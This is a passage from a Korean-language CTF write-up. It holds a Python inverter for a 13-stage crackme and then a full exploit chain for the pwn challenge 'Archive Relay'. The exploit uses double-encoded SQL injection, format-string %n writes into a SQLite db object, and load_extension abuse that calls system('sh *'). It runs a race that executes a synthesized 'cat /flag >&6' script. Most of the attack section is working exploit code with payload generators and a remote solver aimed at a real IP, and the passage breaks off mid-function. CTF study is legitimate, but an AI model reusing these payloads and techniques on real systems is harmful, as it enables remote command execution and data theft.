    output = result.stdout.decode("utf-8", "replace").strip()
    print(f"local={output}")
    assert "Correct!" in output


if __name__ == "__main__":
    main()

```

`solver.py`가 사용하는 13단계 역연산 구현
`fork_stage_inverse.py` 전체:

```python
#!/usr/bin/env python3
"""Invert ThreadMAZE's 13-stage 48-byte dispatcher for the recovered target ctx.

The correctly decrypted target context and a forward A*48 trace were captured
at the 0x4ff6a0 dispatcher with fork_stage_inverse_correcttrace.gdb.
Every inverse is checked against adjacent states in that trace before it is
used on the target state.
"""

from __future__ import annotations

import struct
import hashlib
import hmac
from pathlib import Path


HERE = Path(__file__).resolve().parent
FRAME = (HERE / "fork_stage_inverse_correct_frame.bin").read_bytes()
TRACE = (HERE / "fork_stage_inverse_correct_states.bin").read_bytes()
STATES = [TRACE[i:i + 48] for i in range(0, len(TRACE), 48)]
assert len(FRAME) == 0x18C0 and len(STATES) == 14

ORDER = [11, 2, 5, 1, 0, 6, 3, 9, 4, 7, 10, 12, 8]
TARGET = bytes.fromhex(
    "2fb9239d0fa930b2d8e854058b1f2f3c8acdc72ed5559b71"
    "fde353518855afd48245ca9b65095ccf70c6efd4f88543e5"
)
SBOX = [0xC, 5, 6, 0xB, 9, 0, 0xA, 0xD, 3, 0xE, 0xF, 8, 4, 7, 1, 2]
ISBOX = [SBOX.index(i) for i in range(16)]


def rol(v: int, n: int, bits: int) -> int:
    n %= bits
    mask = (1 << bits) - 1
    return ((v << n) | (v >> (bits - n))) & mask


def ror(v: int, n: int, bits: int) -> int:
    return rol(v, bits - (n % bits), bits)


def u32(x: bytes, off: int = 0) -> int:
    return struct.unpack_from("<I", x, off)[0]


def u64(x: bytes, off: int = 0) -> int:
    return struct.unpack_from("<Q", x, off)[0]


def p32(v: int) -> bytes:
    return struct.pack("<I", v & 0xFFFFFFFF)


def p64(v: int) -> bytes:
    return struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)


def xor_bytes(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))


def fixed_xor_inverse(stage: int, state: bytes) -> bytes:
    pos = ORDER.index(stage)
    stream = xor_bytes(STATES[pos], STATES[pos + 1])
    return xor_bytes(state, stream)


def inverse_stage0(state: bytes) -> bytes:
    key = FRAME[0xD08:0xD68]
    perm = list(range(48))
    cursor = 0
    for i in range(47, 0, -1):
        j = struct.unpack_from("<H", key, cursor)[0] % (i + 1)
        cursor += 2
        perm[i], perm[j] = perm[j], perm[i]
    out = bytearray(48)
    for dst, src in enumerate(perm):
        out[src] = state[dst]
    return bytes(out)


def inverse_stage1(state: bytes) -> bytes:
    cfg = FRAME[0xD68:0xD99]
    key, feedback = cfg[:48], cfg[48]
    out = bytearray(48)
    for i, cur in enumerate(state):
        r = i % 7 + 1
        mixed = ror(cur ^ feedback, r, 8)
        out[i] = (mixed - key[i] - i * 0x11 - 0x3D) & 0xFF
        feedback = (cur + key[(i * 7) % 48]) & 0xFF
    return bytes(out)


def inverse_stage2(state: bytes) -> bytes:
    """Reverse the 32-round 24+24-byte HMAC-SHA256 Feistel network."""
    key = FRAME[0xD99:0xDB9]
    left, right = state[:24], state[24:]
    for round_no in range(31, -1, -1):
        old_right = left
        msg = bytes([round_no, round_no ^ 0xA7]) + old_right
        mask = hmac.new(key, msg, hashlib.sha256).digest()[:24]
        old_left = xor_bytes(right, mask)
        left, right = old_left, old_right
    return left + right


def present_round_keys(key10: bytes) -> list[int]:
    assert len(key10) == 10
    key = int.from_bytes(key10, "big")
    mask80 = (1 << 80) - 1
    keys = []
    for round_no in range(1, 33):
        keys.append(key >> 16)
        if round_no == 32:
            break
        key = ((key << 61) | (key >> 19)) & mask80
        key = (key & ((1 << 76) - 1)) | (SBOX[(key >> 76) & 0xF] << 76)
        key ^= round_no << 15
    return keys


def inv_present_sbox(v: int) -> int:
    out = 0
    for i in range(16):
        out |= ISBOX[(v >> (i * 4)) & 0xF] << (i * 4)
    return out


def inv_present_player(v: int) -> int:
    out = 0
    # Forward P(i)=16*i mod 63 for i<63; bit 63 stays at 63.
    for i in range(63):
        out |= ((v >> ((16 * i) % 63)) & 1) << i
    out |= v & (1 << 63)
    return out


def inverse_stage3(state: bytes) -> bytes:
    cfg = FRAME[0xDB9:0xDCB]
    keys = present_round_keys(cfg[:10])
    iv = cfg[10:18]
    out = bytearray()
    prev = iv
    for off in range(0, 48, 8):
        cblock = state[off:off + 8]
        v = u64(cblock) ^ keys[31]
        for r in range(30, -1, -1):
            v = inv_present_player(v)
            v = inv_present_sbox(v)
            v ^= keys[r]
        out += xor_bytes(p64(v), prev)
        prev = cblock
    return bytes(out)


def arx_round_keys(key32: bytes) -> list[int]:
    words = list(struct.unpack("<4Q", key32))
    a = [words[0]]
    b = [words[1], words[2], words[3]]
    for i in range(33):
        x = ((ror(b[i], 8, 64) + a[i]) & 0xFFFFFFFFFFFFFFFF) ^ i
        b.append(x)
        a.append(rol(a[i], 3, 64) ^ x)
    return a[:34]


def inverse_stage5(state: bytes) -> bytes:
    cfg = FRAME[0xDCB:0xDFB]
    keys = arx_round_keys(cfg[:32])
    prev_l, prev_r = struct.unpack("<2Q", cfg[32:48])
    out = bytearray()
    for off in range(0, 48, 16):
        c_l, c_r = struct.unpack_from("<2Q", state, off)
        l, r = c_l, c_r
        for k in reversed(keys):
            old_r = ror(r ^ l, 3, 64)
            old_l = ror(((l ^ k) - old_r) & 0xFFFFFFFFFFFFFFFF, 56, 64)
            l, r = old_l, old_r
        out += p64(l ^ prev_l) + p64(r ^ prev_r)
        prev_l, prev_r = c_l, c_r
    return bytes(out)


def xtea_decrypt(v0: int, v1: int, key: tuple[int, ...]) -> tuple[int, int]:
    delta = 0x9E3779B9
    total = (delta * 64) & 0xFFFFFFFF
    for _ in range(64):
        v1 = (v1 - ((((v0 << 4) ^ (v0 >> 5)) + v0) ^ (total + key[(total >> 11) & 3]))) & 0xFFFFFFFF
        total = (total - delta) & 0xFFFFFFFF
        v0 = (v0 - ((((v1 << 4) ^ (v1 >> 5)) + v1) ^ (total + key[total & 3]))) & 0xFFFFFFFF
    return v0, v1


def inverse_stage6(state: bytes) -> bytes:
    cfg = FRAME[0xCD0:0xCE8]
    key = struct.unpack("<4I", cfg[:16])
    prev = cfg[16:24]
    out = bytearray()
    for off in range(0, 48, 8):
        cblock = state[off:off + 8]
        v0, v1 = xtea_decrypt(*struct.unpack("<2I", cblock), key)
        out += xor_bytes(struct.pack("<2I", v0, v1), prev)
        prev = cblock
    return bytes(out)


def inverse_stage10(state: bytes) -> bytes:
    program = FRAME[0xE5B:0x125B]
    x = bytearray(state)
    for step in range(127, -1, -1):
        rec = program[step * 8:(step + 1) * 8]
        op = rec[0] % 6
        a = rec[1] % 48
        b = (a + rec[2] % 47 + 1) % 48
        if op == 0:
            x[a], x[b] = x[b], x[a]
        elif op == 1:
            r = rec[3] % 7 + 1
            x[a] = (ror(x[a] ^ x[b], r, 8) - rec[5]) & 0xFF
        elif op == 2:
            r1, r2 = rec[3] % 7 + 1, rec[4] % 7 + 1
            old_b = ror(x[b], r2, 8) ^ x[a]
            old_a = (x[a] - rol(old_b, r1, 8) - rec[5]) & 0xFF
            x[a], x[b] = old_a, old_b
        elif op == 3:
            aw = rec[1] % 12
            bw = (aw + rec[2] % 11 + 1) % 12
            off_a, off_b = aw * 4, bw * 4
            new_a, new_b = u32(x, off_a), u32(x, off_b)
            r1 = rec[3] % 31 + 1
            r2 = rec[4] % 31 + 1
            add = u32(rec, 4)
            old_b = ror(new_b, r2, 32) ^ new_a
            old_a = (new_a - rol(old_b, r1, 32) - add) & 0xFFFFFFFF
            x[off_a:off_a + 4], x[off_b:off_b + 4] = p32(old_a), p32(old_b)
        elif op == 4:
            y = x[a] ^ rec[6]
            x[a] = ISBOX[y & 0xF] | (ISBOX[y >> 4] << 4)
        else:
            shift = rec[1] % 47 + 1
            old = bytearray(48)
            for i in range(48):
                old[(i + shift) % 48] = x[i]
            x = old
    return bytes(x)


def inverse_stage11(state: bytes) -> bytes:
    program = FRAME[0x125B:0x155B]
    x = bytearray(state)
    for step in range(95, -1, -1):
        rec = program[step * 8:(step + 1) * 8]
        a = rec[0] % 48
        b = (a + rec[1] % 47 + 1) % 48
        new_a, new_b = x[a], x[b]
        r1, r2 = rec[2] % 7 + 1, rec[5] % 7 + 1
        old_b = (rol(new_b ^ new_a, r2, 8) - rec[4] - rec[6]) & 0xFF
        old_a = (ror(new_a ^ old_b, r1, 8) - rec[3] - step) & 0xFF
        x[a], x[b] = old_a, old_b
    return bytes(x)


def inverse_stage12(state: bytes) -> bytes:
    program = FRAME[0x155B:0x185B]
    x = bytearray(state)
    for step in range(95, -1, -1):
        rec = program[step * 8:(step + 1) * 8]
        a = rec[0] % 12
        b = (a + rec[1] % 11 + 1) % 12
        off_a, off_b = a * 4, b * 4
        new_a, new_b = u32(x, off_a), u32(x, off_b)
        r1, r2 = rec[2] % 31 + 1, rec[3] % 31 + 1
        add = u32(rec, 4)
        old_b = ror(new_b, r2, 32) ^ new_a
        old_a = ror((new_a - add - old_b - step) & 0xFFFFFFFF, r1, 32)
        x[off_a:off_a + 4], x[off_b:off_b + 4] = p32(old_a), p32(old_b)
    return bytes(x)


INVERSES = {
    0: inverse_stage0,
    1: inverse_stage1,
    2: inverse_stage2,
    3: inverse_stage3,
    4: lambda s: fixed_xor_inverse(4, s),
    5: inverse_stage5,
    6: inverse_stage6,
    7: lambda s: fixed_xor_inverse(7, s),
    8: lambda s: fixed_xor_inverse(8, s),
    9: lambda s: fixed_xor_inverse(9, s),
    10: inverse_stage10,
    11: inverse_stage11,
    12: inverse_stage12,
}


def validate() -> None:
    for pos, stage in enumerate(ORDER):
        if stage not in INVERSES:
            continue
        got = INVERSES[stage](STATES[pos + 1])
        assert got == STATES[pos], (
            f"stage {stage} inverse mismatch at order position {pos}\n"
            f"got  {got.hex()}\nwant {STATES[pos].hex()}"
        )
        print(f"stage {stage:2d}: inverse validated")


def main() -> None:
    validate()
    state = TARGET
    for stage in reversed(ORDER):
        if stage not in INVERSES:
            print(f"stopped before unresolved stage {stage}; state={state.hex()}")
            return
        state = INVERSES[stage](state)
        print(f"after inverse stage {stage:2d}: {state.hex()}")
    print("candidate bytes:", state)
    print("candidate text:", state.decode("ascii"))


if __name__ == "__main__":
    main()

```

---

## 4. Archive Relay

### 결과와 산출물

- 분야: pwn
- 제공 바이너리 SHA-256: `a807324e2066dfe474fd15b8cb1e49653887fe747c298d565ab94477eead3f77`
- 표준 진입점: `solve.py`
- 실제 원격 exploit: `solve_remote.py`
- 로컬 재현 도구: `root_sh_marker_sweep.py`, `root_sh_reverse_sweep.py`, `root_sh_capture.py`

원격 서비스에서 회수해 `flag.txt`에 보관한 플래그는 다음과 같다.

```text
FLAG{2fd37f6760d8687fde426930310af3cec81b1e6f2e281883675c234a5239e9c5eb54d491535b4cacbc14ac12f117b3f6a9ad00cf7a007fa9253265c19befd36708}
```

저장된 자료에는 이 값에 대한 CTFd `correct` 응답 전문은 없다. 따라서 이 문서는 원격 회수와 로컬 exploit 검증을 구분해 기록한다.

### 1. 공격 표면

서비스는 `/api/login`과 `/api/trace`를 제공한다. 분석에서 사용한 결함은 세 가지다.

1. 로그인 계정 값이 URL decoding을 두 번 거친 뒤 SQL 문에 들어가므로 double-encoded SQL injection이 가능하다.
2. operator 권한의 `/api/trace`는 `X-Trace-Note`를 audit log에 기록할 때 사용자 문자열을 포맷 문자열로 사용한다.
3. SQLite extension entry point를 호출하는 ABI와 `system()`의 첫 인자 ABI가 겹친다.

먼저 다음 계정 문자열을 이중 URL 인코딩해 operator 세션을 얻는다.

```sql
x' OR role='operator' --␠
```

위 `␠`는 SQL 주석 문법을 만족시키기 위한 실제 공백 한 칸이다.

그 뒤 trace note의 `%n` 계열 변환을 이용한다. 관측된 스택 배치에서 arg153은 arg179가 저장된 슬롯을 가리키고, arg179는 `sqlite3 *db`를 가리킨다. 따라서 순차 포맷 변환으로 arg179의 하위 바이트를 먼저 바꾼 뒤 `db+offset`에 1, 2, 4바이트 값을 쓸 수 있다.

### 2. extension loading 활성화

대상 DB의 `db+0x32`에 있는 extension-loading 상태 바이트를 `0x07`로 바꾸면 다음 SQL이 실제 동적 로더 경로에 진입한다.

```sql
x' UNION SELECT load_extension('LIBRARY','system') --␠
```

`load_extension()`은 선택한 공유 라이브러리에서 이름이 `system`인 심볼을 찾고 SQLite extension entry 함수처럼 호출한다. 정상 entry 함수의 첫 인자는 `sqlite3 *db`이고, libc `system()` 역시 첫 인자를 명령 문자열 포인터로 해석한다. 결국 호출 순간 DB 객체의 선두가 문자열이면 다음과 같은 효과가 난다.

```c
system((char *)db);
```

DB 객체를 너무 일찍 덮으면 SQLite가 먼저 `db->pVfs` 등을 읽다가 죽는다. 따라서 심볼 해석과 trace worker를 겹치는 TOCTOU race가 필요하다.

### 3. `sh *` 명령과 audit log 스크립트

DB 선두에는 최종적으로 아래 5바이트를 만든다.

```text
73 68 20 2a 00    sh *\0
```

seed trace는 `db+2`에 `%n`으로 `0x00002a20`을 쓰고, final trace는 `db+0`에 `%hn`으로 `0x6873`을 쓴다. 이 순서가 완성되면 extension entry 호출은 `system("sh *")`가 된다.

현재 작업 디렉터리에서 glob의 첫 파일은 `archive-relay-audit.log`이다. 따라서 audit log 자체를 셸 스크립트로 만들면 `sh *`가 그 파일을 실행한다. final note는 포맷 인자들이 가리키는 future slot의 하위 바이트도 조절하여 줄바꿈, `>`와 `&`를 출력하고 다음 줄을 합성한다.

```sh
cat /flag >&6 #
```

마지막 `#`은 서비스가 뒤에 붙이는 ` -> accepted` 등의 audit suffix를 주석 처리한다. fd 6은 race 전에 열어 둔 login socket의 서버 측 descriptor다. 이 descriptor에는 `O_CLOEXEC`가 없어서 `system()`이 띄운 `/bin/sh`에도 상속된다.

### 4. race 순서

`solve_remote.py`의 한 시도는 다음 순서다.

1. `3.34.239.114:1337` bootstrap에 연결해 임시 HTTP 포트를 받는다.
2. double-encoded SQLi로 operator 세션을 얻는다.
3. 단독 trace로 `db+0x32 = 7`을 만들고 worker 완료를 잠시 기다린다.
4. login, final trace, seed trace용 TCP 연결을 미리 연다.
5. `load_extension(..., 'system')` login을 먼저 전송한다.
6. 수십~수천 마이크로초 뒤 audit-script/final trace와 `db+2` seed trace를 전송한다.
7. 세 socket 응답을 모아 `FLAG{...}`를 찾는다.

심볼 해석 시간을 늘리기 위해 기본 후보에는 반복된 `/proc/self/root`를 앞에 붙인 `libkrb5.so.3` 경로를 사용한다. lead time과 라이브러리 경로를 바꾸며 새 인스턴스에서 반복하고, 플래그를 찾은 즉시 `flag.txt`와 성공 메타데이터를 저장하도록 구현되어 있다.

### 5. 검증 증거

공격 체인의 위험한 부분은 원격 재시도 전에 로컬에서 두 단계로 검증했다.

- `root_sh_reverse_results.json`의 index 10은 `lead_us=100`, `gap_us=0`, `mode=separate`, `won=true`를 기록한다. 대응 경로 `root_sh_reverse/010_separate_100_0/PWNED`가 실제로 존재하므로 `system("sh *")`와 audit script 실행이 확인된다.
- `root_sh_capture_results.json`의 index 1은 `captured=true`이고 login socket 응답 앞에서 로컬 hostname `DESKTOP-GFDJA0C`를 회수했다. 이는 audit script가 활성 socket fd로 파일 내용을 보내는 단계까지 검증한다.
- 최종 `flag.txt`는 원격 solver가 같은 redirection 경로로 회수한 값이다.

표준 진입점의 기본 동작은 네트워크를 사용하지 않고 위 세 증거를 검사한다.

```bash
cd pwn/05-archive-relay
python3 solve.py
```

원격 공격은 새 인스턴스를 만들므로 명시적으로 선택해야 한다.

```bash
python3 solve.py --remote
```

race는 환경과 부하에 민감하다. 저장된 플래그와 로컬 증거를 검토하는 데에는 원격 실행이 필요하지 않다.

### 최종 풀이 코드 전체

아래 코드는 표준 진입점과 실제 원격 exploit의 의존성 원문 전체다. `solve_remote.py`는 `root_sh_marker_sweep.py`를, 다시 그 모듈은 `archive_flag_agent.py`를 불러오므로 네 파일을 모두 포함한다. 자격증명은 코드에 없으며 원격 bootstrap 자체가 별도 토큰 인자를 요구하지 않는다.

#### `solve.py`

```python
#!/usr/bin/env python3
"""Safe standard entry point for the Archive Relay solver.

The default action only validates the saved local/remote artifacts.  Pass
``--remote`` explicitly to run the timing-sensitive solver in
``solve_remote.py``; that action creates a fresh challenge instance.
"""

from __future__ import annotations

import argparse
import json
from pathlib import Path
import re


ROOT = Path(__file__).resolve().parent
FLAG_RE = re.compile(r"FLAG\{[0-9a-f]+\}")


def verify_artifacts() -> int:
    flag_path = ROOT / "flag.txt"
    reverse_path = ROOT / "root_sh_reverse_results.json"
    capture_path = ROOT / "root_sh_capture_results.json"
    marker_path = ROOT / "root_sh_reverse/010_separate_100_0/PWNED"

    flag = flag_path.read_text(encoding="utf-8").strip()
    reverse = json.loads(reverse_path.read_text(encoding="utf-8"))
    capture = json.loads(capture_path.read_text(encoding="utf-8"))

    checks = {
        "remote flag has the expected format": bool(FLAG_RE.fullmatch(flag)),
        "local sh-* race created PWNED": marker_path.is_file()
        and any(row.get("won") for row in reverse),
        "local active-socket redirection captured data": any(
            row.get("captured") for row in capture
        ),
    }
    for label, passed in checks.items():
        print(f"[{'OK' if passed else 'FAIL'}] {label}")
    if all(checks.values()):
        print(f"[OK] saved remote flag: {flag}")
        return 0
    return 1


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--remote",
        action="store_true",
        help="run the network solver (fresh remote instance; explicit opt-in)",
    )
    args = parser.parse_args()
    if not args.remote:
        return verify_artifacts()

    from solve_remote import main as remote_main

    remote_main()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

#### `solve_remote.py`

```python
#!/usr/bin/env python3
"""Remote solver for UHCON Archive Relay."""

from __future__ import annotations

import http.client
import importlib.util
import json
from pathlib import Path
import re
import select
import socket
import time
import urllib.parse


ROOT = Path(__file__).resolve().parent
BOOTSTRAP_HOST = "3.34.239.114"
BOOTSTRAP_PORT = 1337

spec = importlib.util.spec_from_file_location("sh_sweep", ROOT / "root_sh_marker_sweep.py")
sh_sweep = importlib.util.module_from_spec(spec)
assert spec.loader is not None
spec.loader.exec_module(sh_sweep)


def bootstrap_instance() -> tuple[socket.socket, int, bytes]:
    sock = socket.create_connection((BOOTSTRAP_HOST, BOOTSTRAP_PORT), timeout=10)
    sock.settimeout(15)
    banner = bytearray()
    deadline = time.monotonic() + 20
    while time.monotonic() < deadline:
        block = sock.recv(4096)
        if not block:
            break
        banner.extend(block)
        match = re.search(rb"site:\s*http://[^:]+:(\d+)/", banner)
        if match:
            return sock, int(match.group(1)), bytes(banner)
    sock.close()
    raise RuntimeError(f"bootstrap banner did not contain a port: {bytes(banner)!r}")


def request(host: str, port: int, method: str, path: str, *, headers=None, body: bytes = b""):
    conn = http.client.HTTPConnection(host, port, timeout=6)
    conn.request(method, path, body=body, headers=headers or {})
    response = conn.getresponse()
    data = response.read()
    status = response.status
    conn.close()
    return status, data


def operator_session(host: str, port: int) -> str:
    body = (
        b"account=x%2527%2520OR%2520role%253D%2527operator%2527"
        b"%2520%252D%252D%2520&pin=x"
    )
    status, data = request(
        host, port, "POST", "/api/login",
        headers={"Content-Type": "application/x-www-form-urlencoded"}, body=body,
    )
    if status != 200:
        raise RuntimeError((status, data))
    match = re.search(rb'"session":"([0-9a-f]+)"', data)
    if not match:
        raise RuntimeError(data)
    return match.group(1).decode()


def trace(host: str, port: int, session: str, note: str) -> tuple[int, bytes]:
    return request(
        host, port, "POST", "/api/trace",
        headers={"X-Session": session, "X-Trace-Note": note},
    )


def login_request(host: str, port: int, library: str) -> bytes:
    sql = f"x' UNION SELECT load_extension('{library}','system') -- "
    account = urllib.parse.quote(urllib.parse.quote(sql, safe=""), safe="")
    body = f"account={account}&pin=x".encode()
    return (
        f"POST /api/login HTTP/1.1\r\nHost: {host}:{port}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
    ).encode() + body


def busy_wait_us(value: int) -> None:
    target = time.perf_counter_ns() + value * 1000
    while time.perf_counter_ns() < target:
        pass


def recv_all(sockets: list[socket.socket], timeout: float = 8.0) -> list[bytes]:
    buffers = [bytearray() for _ in sockets]
    by_fd = {sock.fileno(): index for index, sock in enumerate(sockets)}
    live = set(sockets)
    deadline = time.monotonic() + timeout
    while live and time.monotonic() < deadline:
        readable, _, _ = select.select(list(live), [], [], 0.1)
        for sock in readable:
            index = by_fd[sock.fileno()]
            try:
                data = sock.recv(65536)
            except (ConnectionResetError, OSError):
                data = b""
            if data:
                buffers[index].extend(data)
            else:
                live.remove(sock)
    for sock in sockets:
        sock.close()
    return [bytes(buffer) for buffer in buffers]


def race(host: str, port: int, session: str, lead_us: int, library: str) -> list[bytes]:
    final_note = sh_sweep.redirect_final_note("/flag", 6)
    seed_note = sh_sweep.archive.write_note(0x02, 0x2A20, "n", tail_width=0)
    login_sock = socket.create_connection((host, port), timeout=5)
    final_sock = socket.create_connection((host, port), timeout=5)
    seed_sock = socket.create_connection((host, port), timeout=5)
    for sock in (login_sock, final_sock, seed_sock):
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    time.sleep(0.01)  # allow the server to accept sockets in FD 6/7/8 order
    login_sock.sendall(login_request(host, port, library))
    busy_wait_us(lead_us)
    final_sock.sendall(sh_sweep.archive.raw_trace_request(host, port, session, final_note))
    seed_sock.sendall(sh_sweep.archive.raw_trace_request(host, port, session, seed_note))
    return recv_all([login_sock, final_sock, seed_sock])


def main() -> None:
    leads = [50, 100, 200, 350, 500, 750, 1000, 1500, 2000, 3000, 5000]
    libraries = [
        "/proc/self/root" * 5 + "/usr/lib/x86_64-linux-gnu/libkrb5.so.3",
        "/usr/lib/x86_64-linux-gnu/libkrb5.so.3",
    ]
    attempts: list[dict[str, object]] = []
    for attempt_index in range(44):
        lead_us = leads[attempt_index % len(leads)]
        library = libraries[(attempt_index // len(leads)) % len(libraries)]
        bootstrap = None
        try:
            bootstrap, port, banner = bootstrap_instance()
            session = operator_session(BOOTSTRAP_HOST, port)
            enable = sh_sweep.archive.write_note(0x32, 0x07, "hhn")
            status, body = trace(BOOTSTRAP_HOST, port, session, enable)
            if status != 202:
                raise RuntimeError((status, body))
            time.sleep(0.08)
            responses = race(BOOTSTRAP_HOST, port, session, lead_us, library)
            combined = b"\n".join(responses)
            match = re.search(rb"FLAG\{[^}\r\n]+\}", combined)
            row = {
                "attempt": attempt_index,
                "port": port,
                "lead_us": lead_us,
                "library": library,
                "response_lengths": [len(item) for item in responses],
                "captured": bool(match),
                "banner": banner.decode("utf-8", "replace"),
            }
            attempts.append(row)
            print(json.dumps(row, sort_keys=True), flush=True)
            if match:
                flag = match.group(0).decode()
                with open(f"{ROOT}/flag.txt", "w", encoding="utf-8") as handle:
                    handle.write(flag + "\n")
                with open(f"{ROOT}/remote_success.json", "w", encoding="utf-8") as handle:
                    json.dump({"flag": flag, "attempt": row, "attempts": attempts}, handle, indent=2)
                print("CAPTURED", flag, flush=True)
                return
        except Exception as error:
            row = {"attempt": attempt_index, "lead_us": lead_us, "error": repr(error)}
            attempts.append(row)
            print(json.dumps(row, sort_keys=True), flush=True)
        finally:
            if bootstrap is not None:
                bootstrap.close()
    with open(f"{ROOT}/remote_attempts.json", "w", encoding="utf-8") as handle:
        json.dump(attempts, handle, indent=2)
    raise SystemExit("remote flag was not captured")


if __name__ == "__main__":
    main()
```

#### `root_sh_marker_sweep.py`

```python
#!/usr/bin/env python3
"""Local timing sweep for the Archive Relay ``sh *`` command primitive."""

from __future__ import annotations

import argparse
import importlib.util
import json
import os
from pathlib import Path
import random
import select
import socket
import subprocess
import time
import urllib.parse


ROOT = Path(__file__).resolve().parent
PROB = ROOT / "package" / "deploy" / "prob"

spec = importlib.util.spec_from_file_location("archive_flag", ROOT / "archive_flag_agent.py")
archive = importlib.util.module_from_spec(spec)
assert spec.loader is not None
spec.loader.exec_module(archive)


def safe_final_note(script_line: str, tail_width: int = 0) -> str:
    """Write db[0:2] = b'sh' and append a filter-safe audit script line."""
    if not script_line.endswith(" "):
        raise ValueError("script line must end with one space before the generated comment")
    if any(character in script_line for character in "#>&;"):
        raise ValueError("script line contains a trace-filtered metacharacter")
    chunks = ["%199c"]
    chunks.extend(["%.s"] * 135)       # args2..136
    chunks.append("%hhn")              # arg137 -> arg185 = LF
    chunks.append("%254c")             # arg138, count low db+0 (0x08)
    chunks.extend(["%.s"] * 14)        # args139..152
    chunks.append("%hhn")              # arg153 -> arg179 = db+0
    chunks.append("%2c")               # arg154, count low LF
    chunks.extend(["%.s"] * 30)        # args155..184; precision zero is safe
    chunks.append("%c")                # arg185 -> LF, total count 523
    chunks.append(script_line)
    chunks.append("%31$c")             # generated '#': comment the audit suffix
    width = 0x6873 - (523 + len(script_line) + 1)
    if width <= 0:
        raise ValueError("script line is too long for the sh halfword count")
    chunks.append(f"%07${width}c")
    chunks.append("%179$hn")           # db[0:2] = b'sh'
    if tail_width:
        chunks.append(f"%07${tail_width}c")
    note = "".join(chunks)
    if len(note) > 760:
        raise AssertionError(len(note))
    return note


def marker_final_note(tail_width: int) -> str:
    """Local marker form of :func:`safe_final_note`."""
    return safe_final_note("touch PWNED ", tail_width)


def redirect_final_note(source: str, server_fd: int) -> str:
    """Write ``sh`` and synthesize a new ``cat SOURCE >&FD`` audit line."""
    if not source.startswith("/") or any(character in source for character in " #>&;$()`'\""):
        raise ValueError("source must be a simple absolute path")
    if not 0 <= server_fd <= 9:
        raise ValueError("this compact payload supports one-digit descriptors")
    command_prefix = f"cat {source} "
    chunks = ["%227c"]                  # total 294, low byte '&'
    chunks.extend(["%.s"] * 135)       # args2..136
    chunks.append("%hhn")               # arg137 -> arg185 = '&'
    chunks.append("%226c")              # arg138, total 520, low db+0
    chunks.extend(["%.s"] * 14)        # args139..152
    chunks.append("%hhn")               # arg153 -> arg179 = db+0
    chunks.append("%54c")               # arg154, total 574, low byte '>'
    chunks.extend(["%.s"] * 9)         # args155..163
    chunks.append("%hhn")               # arg164 -> arg183 = '>'
    chunks.append("%204c")              # arg165, total 778, low byte LF
    chunks.extend(["%.s"] * 4)         # args166..169
    chunks.append("%hhn")               # arg170 -> arg177 = LF
    chunks.append("%25960c")            # arg171, total 0x6872
    chunks.extend(["%.s"] * 5)         # args172..176
    chunks.append("%c")                 # arg177 -> LF, total 0x6873
    chunks.append("%.s")                # arg178
    chunks.append("%hn")                # arg179 -> db[0:2] = b'sh'
    chunks.append(command_prefix)
    chunks.extend(["%.s"] * 3)         # args180..182
    chunks.append("%c")                 # arg183 -> '>'
    chunks.append("%.s")                # arg184
    chunks.append("%c")                 # arg185 -> '&'
    chunks.append(f"{server_fd} ")
    chunks.append("%31$c")              # generated '#': comment audit suffix
    count = 0x6873 + len(command_prefix) + 2 + len(f"{server_fd} ") + 1
    restore_pad = (-count) & 0xFF
    if restore_pad == 0:
        restore_pad = 256
    chunks.append(f"%07${restore_pad}c")
    chunks.append("%164$hhn")            # restore arg183's original NULL low byte
    note = "".join(chunks)
    if len(note) > 760:
        raise AssertionError(len(note))
    return note


def combined_marker_note() -> str:
    """Atomically form ``sh *`` and append the marker in one trace record."""
    marker = "touch PWNED "
    chunks = ["%199c"]                  # total 266, low byte LF/db+2
    chunks.extend(["%.s"] * 135)       # args2..136
    chunks.append("%hhn")               # arg137 -> arg185 = LF
    chunks.extend(["%.s"] * 15)        # args138..152
    chunks.append("%hhn")               # arg153 -> arg179 = db+2
    chunks.append("%10518c")            # arg154, total 0x2a20
    chunks.extend(["%.s"] * 24)        # args155..178
    chunks.append("%n")                 # db[2:6] = b' *\\0\\0'
    chunks.extend(["%.s"] * 5)         # args180..184
    chunks.append("%c")                 # arg185 -> LF, total 0x2a21
    chunks.append(marker)
    chunks.append("%31$c")              # generated '#', total 0x2a2e
    chunks.append("%07$218c")           # total low byte 0x08
    chunks.append("%153$hhn")           # arg179 -> db+0
    chunks.append("%07$15723c")         # total 0x6873
    chunks.append("%179$hn")            # db[0:2] = b'sh'
    note = "".join(chunks)
    if len(note) > 760:
        raise AssertionError(len(note))
    return note


def login_wire(host: str, port: int, library: str) -> bytes:
    sql = f"x' UNION SELECT load_extension('{library}','system') -- "
    account = urllib.parse.quote(urllib.parse.quote(sql, safe=""), safe="")
    body = f"account={account}&pin=x".encode()
    return (
        f"POST /api/login HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n\r\n"
    ).encode() + body


def recv_all(sockets: list[socket.socket], timeout: float = 3.0) -> list[bytes]:
    buffers = [bytearray() for _ in sockets]
    by_fd = {sock.fileno(): index for index, sock in enumerate(sockets)}
    live = set(sockets)
    deadline = time.monotonic() + timeout
    while live and time.monotonic() < deadline:
        readable, _, _ = select.select(list(live), [], [], 0.05)
        for sock in readable:
            index = by_fd[sock.fileno()]
            try:
                data = sock.recv(65536)
            except (ConnectionResetError, OSError):
                data = b""
            if data:
                buffers[index].extend(data)
            else:
                live.remove(sock)
    for sock in sockets:
        sock.close()
    return [bytes(buffer) for buffer in buffers]


def wait_port(port: int) -> None:
    deadline = time.monotonic() + 2.0
    while time.monotonic() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.05):
                return
        except OSError:
            time.sleep(0.01)
    raise RuntimeError("local service did not open")


def busy_wait_us(value: int) -> None:
    target = time.perf_counter_ns() + value * 1000
    while time.perf_counter_ns() < target:
        pass


def race(
    port: int,
    session: str,
    notes: list[str],
    delay_us: int,
    trace_gap_us: int,
    library: str,
) -> list[bytes]:
    host = "127.0.0.1"
    login_sock = socket.create_connection((host, port), timeout=2)
